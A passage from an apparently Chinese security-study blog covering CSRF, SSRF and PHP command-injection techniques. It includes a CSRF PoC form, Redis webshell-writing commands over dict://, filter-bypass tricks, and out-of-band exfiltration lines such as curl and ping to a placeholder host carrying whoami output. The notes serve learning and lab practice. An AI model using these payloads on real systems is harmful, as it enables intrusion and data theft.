<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checkToken( <span class="variable">$token</span>, <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br></pre></td></tr></table></div></figure>

<p>会检测用户传入的<code>token</code>，这是一个随机值，每次网站检测完之后会重新生成，然后将新的<code>token</code>发还给用户。</p>
<p>通常这种情况需要结合其他漏洞，比如<code>XSS</code>来获取相关的<code>token</code>值，即变成了<code>XSRF</code>。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27; user. token&#x27;)[0].value</span><br></pre></td></tr></table></div></figure>

<p>即加载当前的<code>csrf</code>这个界面时，会弹出<code>token</code>值。当然，结合其他的手法可以直接获取<code>token</code>然后来伪造链接。</p>
</li>
</ul>

        <h4 id="POST型"   >
          <a href="#POST型" class="heading-link"><i class="fas fa-link"></i></a><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4>
      <p>需要构造<code>POC</code>，在<code>Burp suite</code>中可以<code>右键-&gt;Engagement tools-&gt;Generate CSRF Poc</code>，这样可以生成一个<code>form</code>表单形式来发生<code>POST</code>请求，对应修改相关字段即可。</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.baidu.com/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PIG-007&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">;        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>在添加<code>input</code>标签，然后添加对应需要的值即可</p>

        <h3 id="2-利用"   >
          <a href="#2-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h3>
      <p>通常组合拳形式来<code>XSRF</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610155923179.png" alt="image-20220610155923179"></p>

        <h3 id="3-防御"   >
          <a href="#3-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-防御" class="headerlink" title="(3)防御"></a>(3)防御</h3>
      <ul>
<li>验证<code>Referer</code>和<code>token</code></li>
<li>在<code>HTTP</code>头部加入自定义属性验证</li>
<li>高危操作加入验证码</li>
<li>等等</li>
</ul>

        <h2 id="漏洞SSRF"   >
          <a href="#漏洞SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞SSRF" class="headerlink" title="漏洞SSRF"></a>漏洞SSRF</h2>
      <p><code>SSRF</code>（<code>Server-side Request Forgery</code>）服务端请求伪造</p>
<p>比较常用的就是可以让服务器的相关敏感参数受到我们的控制，比如说我们可以传入一个<code>URL</code>让服务器去爬取，这个<code>URL</code>就是比较敏感的参数。</p>
<p>这样就可以绕过服务器的防火墙了。</p>

        <h3 id="1-可能存在的SSRF"   >
          <a href="#1-可能存在的SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-可能存在的SSRF" class="headerlink" title="(1)可能存在的SSRF"></a>(1)可能存在的SSRF</h3>
      
        <h4 id="①功能服务"   >
          <a href="#①功能服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#①功能服务" class="headerlink" title="①功能服务"></a>①功能服务</h4>
      <p>以下的就可能存在<code>SSRF</code>漏洞</p>
<ul>
<li>请求远端资源</li>
<li>在线翻译</li>
<li>数据库内置功能</li>
<li>编码服务(?api=xxxx)</li>
<li><code>URL</code>网址调用</li>
<li>邮箱邮件</li>
</ul>

        <h4 id="②关键参数"   >
          <a href="#②关键参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②关键参数" class="headerlink" title="②关键参数"></a>②关键参数</h4>
      <p><code>share、target、wap、url、sourceURL、imageURL、source、domain</code>等</p>

        <h4 id="③关键函数"   >
          <a href="#③关键函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#③关键函数" class="headerlink" title="③关键函数"></a>③关键函数</h4>
      <ul>
<li><code>PHP</code>：<ul>
<li><code>file_get_contents()</code></li>
<li><code>fsockopen()</code></li>
<li><code>curl_exec()</code></li>
<li><code>fopen()</code></li>
</ul>
</li>
<li><code>Python</code>：<ul>
<li><code>urllib</code>库<code>http</code>头注入</li>
<li><code>requests</code>库中默认跟随<code>30x</code>跳转</li>
</ul>
</li>
</ul>

        <h3 id="2-利用-1"   >
          <a href="#2-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用-1" class="headerlink" title="(2)利用"></a>(2)利用</h3>
      
        <h4 id="①相关协议"   >
          <a href="#①相关协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#①相关协议" class="headerlink" title="①相关协议"></a>①相关协议</h4>
      <ul>
<li><p><code>file</code>：访问本地文件的协议</p>
</li>
<li><p><code>http</code></p>
</li>
<li><p><code>dict</code>：字典服务器协议，基于查询响应的<code>TCP</code>协议。查询目标服务端口，需要服务具备<code>TCP</code>回显功能</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113058963.png" alt="image-20220612113058963"></p>
<p>常见如下：</p>
<ul>
<li><code>http:80</code></li>
<li><code>https:433</code></li>
<li><code>ftp:20/21</code></li>
<li><code>mysql:3306</code></li>
<li><code>telnet:23</code></li>
<li><code>dns:53</code></li>
<li><code>dhcp:67/68</code></li>
<li><code>sshd:22</code></li>
<li><code>nginx:80</code></li>
<li><code>tomcat:8080</code></li>
<li><code>sql server:1433</code></li>
<li><code>oracle:1521</code></li>
<li><code>smtp:25</code></li>
<li><code>redis:6379</code></li>
</ul>
</li>
<li><p><code>gopher</code>：在<code>HTTP</code>协议之前的，在<code>Internet</code>上常见的协议，支持多行，常用来攻击内网。</p>
</li>
</ul>

        <h4 id="②获取敏感文件"   >
          <a href="#②获取敏感文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#②获取敏感文件" class="headerlink" title="②获取敏感文件"></a>②获取敏感文件</h4>
      <ul>
<li><p><code>Windows</code></p>
<ul>
<li><code>C:/windows/win.ini</code>：保存系统配置文件</li>
</ul>
</li>
<li><p><code>Linux</code></p>
<ul>
<li><p><code>file:///etc/passwd</code>：获取账号密码</p>
</li>
<li><p><code>file:///etc/hosts</code>：本网段的内网IP</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612112056049.png" alt="image-20220612112056049"></p>
<p>之后可以进行内网探测</p>
</li>
</ul>
</li>
</ul>

        <h4 id="③内网横向探测-WEB"   >
          <a href="#③内网横向探测-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#③内网横向探测-WEB" class="headerlink" title="③内网横向探测-WEB"></a>③内网横向探测-WEB</h4>
      
        <h5 id="A-首先获取内网IP"   >
          <a href="#A-首先获取内网IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-首先获取内网IP" class="headerlink" title="A.首先获取内网IP"></a>A.首先获取内网<code>IP</code></h5>
      <p>使用<code>file</code>协议：<code>file:///etc/hosts</code>，但是在虚拟机里不知道怎么获取到对应的<code>docker的IP</code></p>
<p>这里假设本地搭建的虚拟机里面，<code>docker</code>和本虚拟机组成的一个子网</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113904560.png" alt="image-20220612113904560"></p>
<p>即子网中其他的<code>docker的IP</code>就是<code>172.17.0.x</code></p>

        <h5 id="B-信息收集"   >
          <a href="#B-信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-信息收集" class="headerlink" title="B.信息收集"></a>B.信息收集</h5>
      <p>爆破子网存活主机及端口</p>
<p>在<code>BurpSuite</code>中将包发到<code>Intruder</code>，然后添加<code>$</code>进行重放，由于是需要爆破多个位置，那么就使用<code>Clusterbomb</code>模式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120816854.png" alt="image-20220612120816854"></p>
<p>之后在<code>Payload</code>上进行设置两个位置的爆破数值</p>
<p>第一个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120947874.png" alt="image-20220612120947874"></p>
<p>第二个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121049196.png" alt="image-20220612121049196"></p>
<p>开始攻击之后得到结果，依据对应的内容和长度来判断是否存在相关的服务</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121321908.png" alt="image-20220612121321908"></p>

        <h5 id="C-内网穿透"   >
          <a href="#C-内网穿透" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-内网穿透" class="headerlink" title="C.内网穿透"></a>C.内网穿透</h5>
      <p>利用<code>gopher</code>协议来利用构造两个数据包</p>
<ul>
<li>首先将第一个爬虫数据包抓取放到<code>Repeater</code></li>
</ul>

        <h4 id="③内网横向探测-Redis-未授权"   >
          <a href="#③内网横向探测-Redis-未授权" class="heading-link"><i class="fas fa-link"></i></a><a href="#③内网横向探测-Redis-未授权" class="headerlink" title="③内网横向探测-Redis-未授权"></a>③内网横向探测-Redis-未授权</h4>
      
        <h5 id="A-dict协议测试"   >
          <a href="#A-dict协议测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-dict协议测试" class="headerlink" title="A.dict协议测试"></a>A.<code>dict</code>协议测试</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.17.0.2:6379/</span><br></pre></td></tr></table></div></figure>

<p>返回如下<code>OK</code>即代表未授权即可访问，即没有密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612174542324.png" alt="image-20220612174542324"></p>
<p>如果需要密码访问即如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612175006529.png" alt="image-20220612175006529"></p>

        <h5 id="B-写入木马"   >
          <a href="#B-写入木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-写入木马" class="headerlink" title="B.写入木马"></a>B.写入木马</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict://172.17.0.2:6379/flushall</span><br><span class="line">dict://172.17.0.2:6379/config set dir /var/www  (网址根目录)</span><br><span class="line">dict://172.17.0.2:6379/config set dbfilename ssrf.php</span><br><span class="line">dict://172.17.0.2:6379/set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">dict://172.17.0.2:6379/save</span><br></pre></td></tr></table></div></figure>




        <h2 id="XXE"   >
          <a href="#XXE" class="heading-link"><i class="fas fa-link"></i></a><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2>
      
        <h2 id="命令执行"   >
          <a href="#命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2>
      
        <h3 id="1-常用函数"   >
          <a href="#1-常用函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常用函数" class="headerlink" title="(1)常用函数"></a>(1)常用函数</h3>
      
        <h4 id="①eval-函数"   >
          <a href="#①eval-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#①eval-函数" class="headerlink" title="①eval()函数"></a>①<code>eval()</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed eval(string $code);</span><br></pre></td></tr></table></div></figure>

<p>把字符串<code>code</code>当作<code>PHP</code>执行</p>
<ul>
<li><p>代码不能包含打开/关闭<code>PHP tags</code>，比如不能传入<code>&lt;?php echo &quot;Hi&quot;; ?&gt;</code>。但是可以利用闭合形式来关闭<code>PHP</code>再重新打开。比如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;In PHP mode!&quot;; ?&gt; In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;</span><br></pre></td></tr></table></div></figure></li>
<li><p>传入的必须是有效的<code>PHP</code>代码，并且以分号<code>;</code>来进行语句分割，没有正常分割的话会导致一个<code>parse error</code>。</p>
</li>
</ul>

        <h4 id="②assert函数"   >
          <a href="#②assert函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②assert函数" class="headerlink" title="②assert函数"></a>②<code>assert</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert(mixed $assertion[,string $description])</span><br></pre></td></tr></table></div></figure>

<p><code>PHP</code>中用来判断一个表达式是否成立，返回布尔值。</p>
<p>如果<code>assertion</code>为字符串，那么它会被<code>assert()</code>当作<code>PHP</code>代码来执行。</p>

        <h4 id="③preg-replace函数"   >
          <a href="#③preg-replace函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#③preg-replace函数" class="headerlink" title="③preg_replace函数"></a>③<code>preg_replace</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int $limit = -1[,int &amp;$count]])</span><br></pre></td></tr></table></div></figure>

<p>对字符串进行正则处理。搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>来进行替换。当<code>$pattern</code>参数中存在<code>/e</code>修饰符时，<code>$replacement</code>的值会被当作<code>PHP</code>代码执行。</p>
<ul>
<li><code>PHP5.5.0</code>开始，传入<code>\e</code>修饰符会产生<code>E_DEPRECATED</code>错误，但是还是可以生效。而<code>PHP7.0.0</code>开始，会产生<code>E_WARNINIG</code>错误，同时<code>\e</code>无法生效</li>
</ul>
<p>如下代码，传入<code>_=phpinfo();</code>即可触发<code>phpinfo</code>函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo preg_replace(&#x27;/\s/e&#x27;,$_POST[_],$str);</span><br></pre></td></tr></table></div></figure>


        <h4 id="④调用函数过滤不当"   >
          <a href="#④调用函数过滤不当" class="heading-link"><i class="fas fa-link"></i></a><a href="#④调用函数过滤不当" class="headerlink" title="④调用函数过滤不当"></a>④调用函数过滤不当</h4>
      <p>通常用在框架中，小程序很少</p>
<p><code>call_user_func()、call_user_func_array()、array_map()</code>等几十个函数都可以调用其他函数的功能，其中第一个参数为调用的函数名称，如果这个函数名称可控，那么就可以调用任意函数。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func(callable $callback[,mixed $paramenter[,mixed $....]])</span><br></pre></td></tr></table></div></figure>

<p>如下代码所示，传入<code>_assert</code>即可</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="variable">$_POST</span>[_],<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="⑤动态函数执行"   >
          <a href="#⑤动态函数执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤动态函数执行" class="headerlink" title="⑤动态函数执行"></a>⑤动态函数执行</h4>
      <p>可拼接字符串当作函数</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;e&#x27;</span>.<span class="string">&#x27;r&#x27;</span>.<span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p>或者</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;a&#x27;]($_POST[_]);</span><br></pre></td></tr></table></div></figure>

<p>那么传入<code>a=assert</code>和<code>_=phpinfo();</code>即可，但是不能传递<code>eval</code>。</p>

        <h4 id="⑥可用执行命令漏洞函数"   >
          <a href="#⑥可用执行命令漏洞函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑥可用执行命令漏洞函数" class="headerlink" title="⑥可用执行命令漏洞函数"></a>⑥可用执行命令漏洞函数</h4>
      <ul>
<li><p><code>string system(string $command[,int &amp;$return_var])</code></p>
<p>函数执行<code>command</code>参数所指定的命令，并且输出执行结果</p>
</li>
<li><p><code>string exec(string $command[,array &amp;$output[,int &amp;$return_var]])</code></p>
<p>执行<code>command</code>指定的命令</p>
</li>
<li><p><code>string shell_exec(string $cmd)</code></p>
<p>通过<code>shell</code>环境执行命令，将完整的输出以字符串形式返回。</p>
</li>
<li><p><code>void passthru(string $command[,int &amp;$return_var])</code></p>
<p>执行外部程序并且显示原始的输出</p>
</li>
<li><p>``反引号</p>
<p>利用<code>ls</code>，会被当作系统命令执行，其实就是<code>shell_exec()</code>函数进行处理。</p>
</li>
<li><p><code>void pcntl_exec(string $path[,array $args[,array $envs]])</code></p>
<p>多进程处理扩展，需要额外进行安装才行。</p>
</li>
<li><p><code>resource popen(string $command,string $mode)</code></p>
<p>打开一个指向进程的管道，该进程由给定的<code>command</code>命令产生。</p>
</li>
<li><p><code>resource proc_open(string $cmd,array $descriptorspec,array &amp;$pipes[,string $cwd[,array $env[,array $other_options]]])</code></p>
<p>更强大一些，但是需要指定更多的参数</p>
</li>
<li><p><code>bool ob_start([callback $output_callback[,int $chunk_size[,bool $erase]]])</code></p>
<p>控制输出缓冲的，相当于另外开辟一片缓冲区，可通过<code>ob_end_flush</code>来输出缓冲区</p>
<p>可选参数<code>$output_callback</code>被指定后，<code>ob_flush/ob_clean</code>或者类似的函数进行刷新时，会调用该回调函数，并且调用时输出缓冲区的内容会被当作参数去执行，并且返回一个新的缓冲区作为结果。</p>
</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">passthru(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> `whoami`;</span><br><span class="line">pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line">popen(<span class="string">&#x27;whoami &gt;&gt; 123.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;1.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>)),</span><br><span class="line"><span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)),</span><br><span class="line"><span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;a&quot;</span>));</span><br><span class="line"><span class="comment">//控制标准输入输出和错误输出</span></span><br><span class="line">proc_open(<span class="string">&quot;whoami &gt;&gt; 1.txt&quot;</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">ob_start(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$_GET</span>[a]&quot;</span>;</span><br><span class="line">ob_end_flush();<span class="comment">//会输出缓冲区内容</span></span><br><span class="line"><span class="comment">//传入为whoami即可执行命令</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-绕过"   >
          <a href="#2-绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过" class="headerlink" title="(2)绕过"></a>(2)绕过</h3>
      <ul>
<li>命令方面</li>
</ul>
<p><code>&amp;</code>、<code>|</code>、<code>;</code>、<code>&amp;&amp;</code>、<code>||</code>之类的</p>
<ul>
<li><p>空格绕过</p>
<ul>
<li><p><code>IFS</code>，为<code>shell</code>的内置变量，用于分割字段，默认值为空(可当作空格、<code>tab</code>、换行)。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;text</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>&#123;&#125;</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,text&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>tab</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09text</span><br></pre></td></tr></table></div></figure></li>
<li><p>重定向</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;text</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p>黑名单绕过</p>
<ul>
<li><p>拼接</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=tex;d=t;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>使用环境变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;SHELLOPTS&#125;</span><br><span class="line">echo $&#123;SHELLOPTS:3:1&#125;</span><br><span class="line">&#123;SHELLOPTS:3:1&#125;at$&#123;IFS&#125;text</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613112926445.png" alt="image-20220613112926445"></p>
</li>
<li><p>使用空变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat t&#123;x&#125;ext</span><br></pre></td></tr></table></div></figure></li>
<li><p>使用通配符</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ca? tex?</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113027598.png" alt="image-20220613113027598"></p>
</li>
<li><p>使用反斜杠</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t tex\t</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113106132.png" alt="image-20220613113106132"></p>
</li>
<li><p><code>base64</code>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo t|base64</span><br><span class="line">ca$(echo &quot;dAo=&quot;|base -d) text</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113225371.png" alt="image-20220613113225371"></p>
</li>
</ul>
</li>
<li><p>无回显绕过</p>
<ul>
<li><p>使用<code>HTTP</code>通道带出数据</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl host/`whoami`</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613114812865.png" alt="image-20220613114812865"></p>
</li>
<li><p>使用<code>DNS</code>通道带出数据</p>
<p>一样的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.host</span><br></pre></td></tr></table></div></figure></li>
<li><p>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl hosts/$(whoami|base64)</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="3-防御-1"   >
          <a href="#3-防御-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-防御-1" class="headerlink" title="(3)防御"></a>(3)防御</h3>
      <p>正则表达式白名单、过滤</p>

        <h2 id="漏洞JAVA反序列化"   >
          <a href="#漏洞JAVA反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞JAVA反序列化" class="headerlink" title="漏洞JAVA反序列化"></a>漏洞JAVA反序列化</h2>
      <p>从数据对象反序列化成内存对象的过程，主要是各种链子，有点困难，需要后续慢慢研究。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">CVE-2021-22555</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-04-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-24</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1>
      <p>参考文章：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>或者我写的菜鸡项目：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll.git" >KernelAll</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h2>
